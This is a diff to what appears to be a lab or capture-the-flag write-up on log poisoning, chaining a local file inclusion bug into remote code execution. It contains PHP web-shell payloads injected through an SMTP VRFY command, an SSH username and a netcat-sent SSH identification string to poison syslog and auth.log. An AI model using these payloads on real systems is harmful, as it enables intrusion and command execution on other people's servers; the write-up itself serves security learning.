@@ -93,7 +93,7 @@ With this in mind, we can exploit this to achieve RCE. Let's use the _**VRFY**_ 
 VRFY <?php system($_GET['cmd']); ?>
 ```
 
-Now, reading the `/var/log/syslog` via the LFI vulnerability, we have gained a webshell. We can access it via the command:
+Now, reading the `/var/log/syslog` via the LFI vulnerability, we are able to view the output of our command that will be executed on the vulnerable machine. With that, we have a gained a web shell. The output can be viewed with the command:
 
 {% code overflow="wrap" %}
 ```sh
@@ -108,7 +108,25 @@ We can now replace the command to look around the directory and view the content
 
 #### 2. SSH (port 22) \~ `/var/log/auth.log`&#x20;
 
-...
+**Username**
+
+I attempted to send a payload via the username field to SSH:
+
+```sh
+$ ssh '<?php system('id'); ?>'@<host>
+```
+
+However, the SSH client does not allow special characters in the username.
+
+**Identification string**
+
+I explored another method to poison the logs via the identification string:
+
+```sh
+$ nc <host> 22
+SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.11
+<?php system($_GET['cmd']); ?> # click enter right after
+```
 
 #### Interesting discovery
 
